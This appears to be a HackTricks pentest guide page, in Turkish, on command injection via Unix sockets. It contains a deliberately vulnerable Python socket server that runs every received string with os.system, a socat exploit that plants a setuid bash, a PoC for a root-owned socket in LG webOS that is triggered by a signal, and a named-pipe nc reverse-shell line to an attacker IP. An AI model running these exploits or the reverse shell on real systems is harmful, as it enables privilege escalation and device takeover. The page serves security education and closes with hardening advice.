# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Python ile socket binding örneği

Aşağıdaki örnekte bir **unix socket oluşturulur** (`/tmp/socket_test.s`) ve **alınan her şey** `os.system` tarafından **çalıştırılır**.Bunun gerçek hayatta karşınıza çıkmayacağını biliyorum, ancak bu örneğin amacı unix socket kullanan bir kodun nasıl göründüğünü ve en kötü durum senaryosunda girdinin nasıl yönetileceğini görmektir.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Execute** the code using python: `python s.py` ve **socket'in nasıl dinleme yaptığını kontrol edin**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Vaka çalışması: Root-owned UNIX socket signal-triggered escalation (LG webOS)

Bazı privileged daemon'lar, güvenilmeyen girdiyi kabul eden ve privileged eylemleri thread-ID'lere ve sinyallere bağlayan root-owned bir UNIX socket sunar. Protokol, ayrıcalıksız bir client'ın hangi native thread'in hedef alınacağını etkilemesine izin veriyorsa, privileged bir code path'i tetikleyerek yetki yükseltebilirsiniz.<sup>[[1]](#references)</sup>

Gözlemlenen pattern:
- Root-owned bir socket'e bağlanın (ör. /tmp/remotelogger).
- Bir thread oluşturun ve native thread id'sini (TID) alın.
- İstek olarak TID'yi (packed) ve padding'i gönderin; bir acknowledgement alın.
- Privileged davranışı tetiklemek için bu TID'ye belirli bir signal gönderin.

Minimal PoC taslağı:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Bunu bir root shell'e dönüştürmek için basit bir named-pipe + nc pattern'i kullanılabilir:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Notlar:
- Bu bug sınıfı, ayrıcalıksız istemci durumundan (TIDs) türetilen değerlere güvenilmesinden ve bunların ayrıcalıklı signal handler'lara veya mantığa bağlanmasından kaynaklanır.
- Socket üzerinde kimlik bilgilerini zorunlu kılarak, message format'larını doğrulayarak ve ayrıcalıklı işlemleri dışarıdan sağlanan thread identifier'larından ayırarak sistemi harden edin.

## References

- [1] [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
